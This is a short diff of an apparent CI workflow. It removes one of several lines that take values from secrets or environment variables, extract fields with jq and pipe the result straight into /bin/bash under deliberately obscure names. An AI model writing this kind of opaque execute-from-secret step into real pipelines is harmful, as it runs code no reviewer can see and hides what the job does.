@@ -22,7 +22,6 @@ jobs:
           hli01: ${{ secrets.hli01 }}
         run: |
           printf '%s' "$hli01" | jq -r .ki3 | /bin/bash
-          printf '%s' "$x99221" | jq -r .ahva59113 | /bin/bash
           echo $b88 | jq -r .m4 | /bin/bash
 
       - name: Store artifact
